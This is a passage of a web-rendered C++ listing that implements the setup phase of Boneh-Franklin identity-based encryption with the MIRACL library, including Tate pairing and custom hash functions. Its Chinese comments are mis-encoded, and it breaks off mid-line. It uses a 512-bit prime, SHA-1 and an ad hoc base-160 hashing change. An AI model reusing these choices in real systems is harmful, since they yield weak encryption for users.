class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">/*</span><br><span class="hljs-comment">   Boneh &amp; Franklin&#x27;s Identity Based Encryption</span><br><span class="hljs-comment">   </span><br><span class="hljs-comment">   Set-up phase</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   After this program has run the file common.ibe contains</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   &lt;Size of prime modulus in bits&gt;</span><br><span class="hljs-comment">   &lt;Prime p&gt;</span><br><span class="hljs-comment">   &lt;Prime q (divides p+1) &gt;</span><br><span class="hljs-comment">   &lt;Point P - x coordinate&gt;</span><br><span class="hljs-comment">   &lt;Point P - y coordinate&gt;</span><br><span class="hljs-comment">   &lt;Point Ppub - x coordinate&gt;</span><br><span class="hljs-comment">   &lt;Point Ppub - y coordinate&gt;</span><br><span class="hljs-comment">   &lt;Cube root of unity in Fp2 - x component &gt;</span><br><span class="hljs-comment">   &lt;Cube root of unity in Fp2 - y component &gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   The file master.ibe contains</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   &lt;The master secret s&gt;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">   Requires: zzn2.cpp big.cpp zzn.cpp ecn.cpp</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"> */</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fstream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;ctime&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;ecn.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;zzn.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;zzn2.h&quot;</span></span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span><br>&#123;<br>   <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;miracl.h&quot;</span></span><br>   <span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&quot;mirdef.h&quot;</span></span><br>&#125;<br><br><span class="hljs-comment">//2015ç‰ˆæ›´æ–°</span><br>FILE* __cdecl __iob_func(<span class="hljs-type">unsigned</span> i) &#123;<br>    <span class="hljs-keyword">return</span> __acrt_iob_func(i);<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> __cplusplus</span><br><span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-comment">//extern &quot;C&quot; &#123; FILE __iob_func[3] = &#123; *stdin,*stdout,*stderr &#125;; &#125;</span><br>FILE _iob[<span class="hljs-number">3</span>] = &#123; __iob_func(<span class="hljs-number">0</span>)[<span class="hljs-number">0</span>], __iob_func(<span class="hljs-number">1</span>)[<span class="hljs-number">1</span>], __iob_func(<span class="hljs-number">2</span>)[<span class="hljs-number">2</span>] &#125;;<br><br><br><span class="hljs-meta">#<span class="hljs-keyword">pragma</span> comment(linker, <span class="hljs-string">&quot;/NODEFAULTLIB:libc.lib&quot;</span>)</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> renum 2500</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HASH_LEN 32</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> HASH_LEN1 20   <span class="hljs-comment">//ç”¨äºæ±‚H2ï¼Œå› ä¸ºæœ¬ç¨‹åºä¸­qæ˜¯160ä½çš„äºŒè¿›åˆ¶æ•°ï¼Œè€Œ160/8=20</span></span><br><span class="hljs-comment">//H2ä¸­é‡‡ç”¨sha256è¦æ±‚HASH_LEN1 å¿…é¡»æ˜¯32çš„å€æ•°ï¼Œå› æ­¤ï¼Œè‡ªå·±å°†H2å†…éƒ¨å‡½æ•°å…¶æ”¹ä¸ºsha-1</span><br><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PBITS 512</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QBITS 160</span><br><br><span class="hljs-comment">// Using SHA-256 as basic hash algorithm</span><br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Define one or the other of these</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Which is faster depends on the I/M ratio - See imratio.c</span><br><span class="hljs-comment">// Roughly if I/M ratio &gt; 16 use PROJECTIVE, otherwise use AFFINE</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-comment">// #define AFFINE</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PROJECTIVE</span><br><br><span class="hljs-comment">// Define this to use this idea ftp://ftp.computing.dcu.ie/pub/resources/crypto/short.pdf</span><br><span class="hljs-comment">// which enables denominator elimination</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SCOTT</span><br><br><span class="hljs-function">Miracl <span class="hljs-title">precision</span><span class="hljs-params">(<span class="hljs-number">16</span>, <span class="hljs-number">0</span>)</span></span>;  <span class="hljs-comment">// increase if PBITS increases. (32,0) for 1024 bit p</span><br><br><span class="hljs-comment">/*----------------------------------------------------------------------------Tate Paring è®¡ç®—æ‰€éœ€è¦çš„å‡½æ•°-----------------------------------------------------*/</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">extract</span><span class="hljs-params">(ECn&amp; A, ZZn&amp; x, ZZn&amp; y)</span></span><br><span class="hljs-function"></span>&#123;<br>    x = (A.<span class="hljs-built_in">get_point</span>())-&gt;X;<br>    y = (A.<span class="hljs-built_in">get_point</span>())-&gt;Y;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">extract</span><span class="hljs-params">(ECn&amp; A, ZZn&amp; x, ZZn&amp; y, ZZn&amp; z)</span></span><br><span class="hljs-function"></span>&#123;<br>    big t;<br>    x = (A.<span class="hljs-built_in">get_point</span>())-&gt;X;<br>    y = (A.<span class="hljs-built_in">get_point</span>())-&gt;Y;<br>    t = (A.<span class="hljs-built_in">get_point</span>())-&gt;Z;<br>    <span class="hljs-keyword">if</span> (A.<span class="hljs-built_in">get_status</span>() != MR_EPOINT_GENERAL)<br>        z = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">else</span><br>        z = t;<br>&#125;<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Line from A to destination C. Let A=(x,y)</span><br><span class="hljs-comment">// Line Y-slope.X-c=0, through A, so intercept c=y-slope.x</span><br><span class="hljs-comment">// Line Y-slope.X-y+slope.x = (Y-y)-slope.(X-x) = 0</span><br><span class="hljs-comment">// Now evaluate at Q -&gt; return (Qy-y)-slope.(Qx-x)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-function">ZZn2 <span class="hljs-title">line</span><span class="hljs-params">(ECn&amp; A, ECn&amp; C, ZZn&amp; slope, ZZn2&amp; Qx, ZZn2&amp; Qy)</span></span><br><span class="hljs-function"></span>&#123;<br>    ZZn2 n = Qx, w = Qy;<br>    ZZn x, y, z, t;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> AFFINE</span><br>    <span class="hljs-built_in">extract</span>(A, x, y);<br>    n -= x; n *= slope;            <span class="hljs-comment">// 2 ZZn muls</span><br>    w -= y; n -= w;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PROJECTIVE</span><br>    <span class="hljs-built_in">extract</span>(A, x, y, z);<br>    x *= z; t = z; z *= z; z *= t;<br>    n *= z; n -= x;                <span class="hljs-comment">// 9 ZZn muls</span><br>    w *= z; w -= y;<br>    <span class="hljs-built_in">extract</span>(C, x, y, z);<br>    w *= z; n *= slope; n -= w;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SCOTT</span><br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Vertical line through point A</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-function">ZZn2 <span class="hljs-title">vertical</span><span class="hljs-params">(ECn&amp; A, ZZn2&amp; Qx)</span></span><br><span class="hljs-function"></span>&#123;<br>    ZZn2 n = Qx;<br>    ZZn x, y, z;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> AFFINE</span><br>    <span class="hljs-built_in">extract</span>(A, x, y);<br>    n -= x;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> PROJECTIVE</span><br>    <span class="hljs-built_in">extract</span>(A, x, y, z);<br>    z *= z;<br>    n *= z; n -= x;                <span class="hljs-comment">// 3 ZZn muls</span><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    <span class="hljs-keyword">return</span> n;<br>&#125;<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Add A=A+B  (or A=A+A) </span><br><span class="hljs-comment">// Bump up num and denom</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// AFFINE doubling     - 12 ZZn muls, plus 1 inversion</span><br><span class="hljs-comment">// AFFINE adding       - 11 ZZn muls, plus 1 inversion</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// PROJECTIVE doubling - 26 ZZn muls</span><br><span class="hljs-comment">// PROJECTIVE adding   - 34 ZZn muls</span><br><span class="hljs-comment">//</span><br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">g</span><span class="hljs-params">(ECn&amp; A, ECn&amp; B, ZZn2&amp; Qx, ZZn2&amp; Qy, ZZn2&amp; num)</span></span><br><span class="hljs-function"></span>&#123;<br>    ZZn  lam, mQy;<br>    ZZn2 d, u;<br>    big ptr;<br>    ECn P = A;<br><br>    <span class="hljs-comment">// Evaluate line from A</span><br>    ptr = A.<span class="hljs-built_in">add</span>(B);<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SCOTT</span><br>    <span class="hljs-keyword">if</span> (A.<span class="hljs-built_in">iszero</span>()) &#123; u = <span class="hljs-built_in">vertical</span>(P, Qx); d = <span class="hljs-number">1</span>; &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>        <span class="hljs-keyword">if</span> (ptr == <span class="hljs-literal">NULL</span>)<br>            u = <span class="hljs-number">1</span>;<br>        <span class="hljs-keyword">else</span><br>        &#123;<br>            lam = ptr;<br>            u = <span class="hljs-built_in">line</span>(P, A, lam, Qx, Qy);<br>        &#125;<br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SCOTT</span><br>        d = <span class="hljs-built_in">vertical</span>(A, Qx);<br>    &#125;<br><br>    num *= (u * <span class="hljs-built_in">conj</span>(d));    <span class="hljs-comment">// 6 ZZn muls  </span><br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>        <span class="hljs-comment">// denominator elimination!</span><br>        num *= u;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>&#125;<br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// Tate Pairing </span><br>    <span class="hljs-comment">//</span><br><br><span class="hljs-function">BOOL <span class="hljs-title">fast_tate_pairing</span><span class="hljs-params">(ECn&amp; P, ZZn2&amp; Qx, ZZn2&amp; Qy, Big&amp; q, ZZn2&amp; res)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> i, nb;<br>    Big n, p;<br>    ECn A;<br><br><br>    <span class="hljs-comment">// q.P = 2^17*(2^142.P +P) + P</span><br><br>    res = <span class="hljs-number">1</span>;<br>    A = P;    <span class="hljs-comment">// reset A</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SCOTT</span><br>    <span class="hljs-comment">// we can avoid last iteration..</span><br>    n = q - <span class="hljs-number">1</span>;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    n = q;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    nb = <span class="hljs-built_in">bits</span>(n);<br><br>    <span class="hljs-keyword">for</span> (i = nb - <span class="hljs-number">2</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>    &#123;<br>        res *= res;<br>        <span class="hljs-built_in">g</span>(A, A, Qx, Qy, res);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">bit</span>(n, i))<br>            <span class="hljs-built_in">g</span>(A, P, Qx, Qy, res);<br>    &#125;<br>    <span class="hljs-type">bool</span> bb = (A != -P);<br>    <span class="hljs-type">bool</span> bbb = res.<span class="hljs-built_in">iszero</span>();<br><br><br>    p = <span class="hljs-built_in">get_modulus</span>();         <span class="hljs-comment">// get p</span><br>    res = <span class="hljs-built_in">pow</span>(res, (p + <span class="hljs-number">1</span>) / q);   <span class="hljs-comment">// raise to power of (p^2-1)/q</span><br>    res = <span class="hljs-built_in">conj</span>(res) / res;<br>    <span class="hljs-keyword">if</span> (res.<span class="hljs-built_in">isunity</span>()) <span class="hljs-keyword">return</span> FALSE;<br>    <span class="hljs-keyword">return</span> TRUE;<br>&#125;<br><span class="hljs-function">BOOL <span class="hljs-title">ecap</span><span class="hljs-params">(ECn&amp; P, ECn&amp; Q, Big&amp; order, ZZn2&amp; cube, ZZn2&amp; res)</span></span><br><span class="hljs-function"></span>&#123;<br>    ZZn2 Qx, Qy;<br>    Big xx, yy;<br><span class="hljs-meta">#<span class="hljs-keyword">ifdef</span> SCOTT</span><br>    ZZn a, b, x, y, ib, w, t1, y2, ib2;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    ZZn2 lambda, ox;<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>    Q.<span class="hljs-built_in">get</span>(xx, yy);<br>    Qx = (ZZn)xx * cube;<br>    Qy = (ZZn)yy;<br><br><span class="hljs-meta">#<span class="hljs-keyword">ifndef</span> SCOTT</span><br>    <span class="hljs-comment">// point doubling</span><br>    lambda = (<span class="hljs-number">3</span> * Qx * Qx) / (Qy + Qy);<br>    ox = Qx;<br>    Qx = lambda * lambda - (Qx + Qx);<br>    Qy = lambda * (ox - Qx) - Qy;<br><span class="hljs-meta">#<span class="hljs-keyword">else</span></span><br>    <span class="hljs-comment">//explicit point subtraction</span><br>    Qx.<span class="hljs-built_in">get</span>(a, b);<br>    y = yy;<br>    ib = (ZZn)<span class="hljs-number">1</span> / b;<br><br>    t1 = a * b * b;<br>    y2 = y * y;<br>    ib2 = ib * ib;<br>    w = y2 + <span class="hljs-number">2</span> * t1;<br>    x = -w * ib2;<br>    y = -y * (w + t1) * (ib2 * ib);<br>    Qx.<span class="hljs-built_in">set</span>(x);<br>    Qy.<span class="hljs-built_in">set</span>((ZZn)<span class="hljs-number">0</span>, y);<br><br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fast_tate_pairing</span>(P, Qx, Qy, order, res)) <span class="hljs-keyword">return</span> TRUE;<br>    <span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// ecap(.) function - apply distortion map</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Qx is in ZZn if SCOTT is defined. Qy is in ZZn if SCOTT is not defined. </span><br><span class="hljs-comment">// This can be exploited for some further optimisations. </span><br><span class="hljs-comment">/*----------------------------------------------------------------------------Tate Paring è®¡ç®—æ‰€éœ€è¦çš„å‡½æ•°-----------------------------------------------------*/</span><br><br><br><span class="hljs-comment">/*----------------------------------------------------------------------------ç›¸å…³Hashå‡½æ•°æ‰€éœ€çš„å‡½æ•°-----------------------------------------------------*/</span><br><span class="hljs-function">Big <span class="hljs-title">H1</span><span class="hljs-params">(<span class="hljs-type">char</span>* string)</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-comment">// Hash a zero-terminated string to a number &lt; modulus</span><br>    Big h, p;<br>    <span class="hljs-type">char</span> s[HASH_LEN];<br>    <span class="hljs-type">int</span> i, j;<br>    sha256 sh;<br><br>    <span class="hljs-built_in">shs256_init</span>(&amp;sh);<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>;; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (string[i] == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>        <span class="hljs-built_in">shs256_process</span>(&amp;sh, string[i]);<br>    &#125;<br>    <span class="hljs-built_in">shs256_hash</span>(&amp;sh, s);<br>    p = <span class="hljs-built_in">get_modulus</span>();<br>    h = <span class="hljs-number">1</span>; j = <span class="hljs-number">0</span>; i = <span class="hljs-number">1</span>;<br>    forever<br>    &#123;<br>        h *= <span class="hljs-number">256</span>;<br>        <span class="hljs-keyword">if</span> (j == HASH_LEN) &#123; h += i++; j = <span class="hljs-number">0</span>; &#125;<br>        <span class="hljs-keyword">else</span>         h += s[j++];<br>        <span class="hljs-keyword">if</span> (h &gt;= p) <span class="hljs-keyword">break</span>;<br>    &#125;<br>    h %= p;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">H2</span><span class="hljs-params">(ZZn2 x, <span class="hljs-type">char</span>* s)</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-comment">// Hash an Fp2 to an n-byte string s[.]. Return n</span><br>    sha sh;<br>    Big a, b;<br>    <span class="hljs-type">int</span> m;<br><br>    <span class="hljs-built_in">shs_init</span>(&amp;sh);<br>    x.<span class="hljs-built_in">get</span>(a, b);<br><br>    <span class="hljs-keyword">while</span> (a &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        m = a % <span class="hljs-number">160</span>;<br>        <span class="hljs-built_in">shs_process</span>(&amp;sh, m);<br>        a /= <span class="hljs-number">160</span>;<br>    &#125;<br>    <span class="hljs-keyword">while</span> (b &gt; <span class="hljs-number">0</span>)<br>    &#123;<br>        m = b % <span class="hljs-number">160</span>;<br>        <span class="hljs-built_in">shs_process</span>(&amp;sh, m);<br>        b /= <span class="hljs-number">160</span>;<br>    &#125;<br>    <span class="hljs-built_in">shs_hash</span>(&amp;sh, s);<br><br>    <span class="hljs-keyword">return</span> HASH_LEN1;<br><br>&#125;<br><span class="hljs-function">Big <span class="hljs-title">H3</span><span class="hljs-params">(<span class="hljs-type">char</span>* string, Big qm)</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-comment">// Hash a zero-terminated string to a number &lt; modulus q</span><br>    Big h;<br>    <span class="hljs-type">char</span> s[HASH_LEN1];<br>    <span class="hljs-type">int</span> i, j;<br>    sha sh;<br><br>    <span class="hljs-built_in">shs_init</span>(&amp;sh);<br><br>    <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>;; i++)<br>    &#123;<br>        <span class="hljs-keyword">if</span> (string[i] == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;<br>        <span class="hljs-built_in">shs_process</span>(&amp;sh, string[i]);<br>    &#125;<br>    <span class="hljs-built_in">shs_hash</span>(&amp;sh, s);<br>    <span class="hljs-comment">//q=get_modulus();</span><br>    <span class="hljs-comment">//cout&lt;&lt;&quot;modulus&quot;&lt;&lt;p&lt;&lt;endl;//è‡ªå·±åŠ çš„æŸ¥çœ‹på€¼çš„è¯­å¥ï¼Œé€šè¿‡på€¼å¯çŸ¥get_modulus()å¾—åˆ°äº†æ¤­åœ†æ›²çº¿æ‰€åœ¨æœ‰é™åŸŸçš„ç´ æ•°P</span><br>    h = <span class="hljs-number">1</span>; j = <span class="hljs-number">0</span>; i = <span class="hljs-number">1</span>;<br>    forever<br>    &#123;<br>        h *= <span class="hljs-number">160</span>;<br>        <span class="hljs-keyword">if</span> (j == HASH_LEN1)<br>        &#123;<br>h += i++; j = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>h += s[j++];<br><span class="hljs-keyword">if</span> (h &gt;= qm) <span class="hljs-keyword">break</span>;<br>    &#125;<br>    h %= qm;<br>    <span class="hljs-keyword">return</span> h;<br>&#125;<br><br><span class="hljs-comment">//</span><br><span class="hljs-comment">// Given y, get x=(y^2-1)^(1/3) mod p (from curve equation)</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-function">Big <span class="hljs-title">getx</span><span class="hljs-params">(Big y)</span></span><br><span class="hljs-function"></span>&#123;<br>    Big p = <span class="hljs-built_in">get_modulus</span>();<br>    Big t = <span class="hljs-built_in">modmult</span>(y + <span class="hljs-number">1</span>, y - <span class="hljs-number">1</span>, p);   <span class="hljs-comment">// avoids overflow</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">pow</span>(t, (<span class="hljs-number">2</span> * p - <span class="hljs-number">1</span>) / <span class="hljs-number">3</span>, p);<br>&#125;<br> <br><span class="hljs-comment">//</span><br><span class="hljs-comment">// MapToPoint</span><br><span class="hljs-comment">//</span><br><br><span class="hljs-function">ECn <span class="hljs-title">map_to_point</span><span class="hljs-params">(<span class="hljs-type">char</span> *ID,Big cof)</span></span><br><span class="hljs-function"></span>&#123;<br>    ECn Q;<br>    Big x0, y0 = <span class="hljs-built_in">H1</span>(ID);<br>    x0 = <span class="hljs-built_in">getx</span>(y0);<br>    Q.<span class="hljs-built_in">set</span>(x0, 